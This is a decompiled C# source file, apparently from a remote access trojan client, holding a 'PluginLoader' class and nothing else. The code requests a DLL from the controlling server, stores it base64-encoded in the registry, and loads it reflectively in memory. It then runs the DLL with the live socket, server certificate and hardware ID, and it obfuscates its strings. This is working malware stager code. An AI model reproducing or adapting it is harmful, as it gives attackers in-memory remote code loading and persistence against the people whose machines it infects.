using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using Leb128;

namespace Client.Helper
{
	// Token: 0x02000011 RID: 17
	internal class PluginLoader
	{
		// Token: 0x06000064 RID: 100 RVA: 0x00005670 File Offset: 0x00003870
		public static void SaveInvoke(object[] objects, Client client)
		{
			SetRegistry.SetValue((string)objects[1], Convert.ToBase64String((byte[])objects[2]));
			foreach (object[] array in PluginLoader.invokes.ToList<object[]>())
			{
				if ((string)array[0] == (string)objects[1])
				{
					client.Disconnect();
					PluginLoader.Load(array, Program.client);
					PluginLoader.invokes.Remove(array);
				}
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00005718 File Offset: 0x00003918
		public static void Invoke(object[] objects, Client client)
		{
			if (SetRegistry.GetValue((string)objects[1]) == null)
			{
				Client client2 = new Client();
				string[] array = client.socket.RemoteEndPoint.ToString().Split(new char[]
				{
					':'
				});
				client2.Connect(array[0], array[1]);
				client2.Send(LEB128.Write(new object[]
				{
					EncryptString.Decode("GetDLL"),
					(string)objects[1]
				}));
				PluginLoader.invokes.Add(new object[]
				{
					(string)objects[1],
					(byte[])objects[2]
				});
				return;
			}
			PluginLoader.Load(new object[]
			{
				(string)objects[1],
				(byte[])objects[2]
			}, Program.client);
		}

		// Token: 0x06000066 RID: 102 RVA: 0x000057EC File Offset: 0x000039EC
		public static void Load(object[] Messages, Client client)
		{
			try
			{
				Type type = AppDomain.CurrentDomain.Load(Convert.FromBase64String(SetRegistry.GetValue((string)Messages[0]))).GetType(EncryptString.Decode("Plugin.Plugin"));
				object obj = Activator.CreateInstance(type);
				MethodInfo method = type.GetMethod(EncryptString.Decode("Run"));
				object[] parameters = new object[]
				{
					client.socket,
					Config.ServerCertificate,
					Config.Hwid,
					(byte[])Messages[1]
				};
				method.Invoke(obj, parameters);
			}
			catch (Exception ex)
			{
				client.Error(EncryptString.Decode("Load error: ") + ex.ToString());
			}
		}

		// Token: 0x0400003A RID: 58
		public static List<object[]> invokes = new List<object[]>();
	}
}
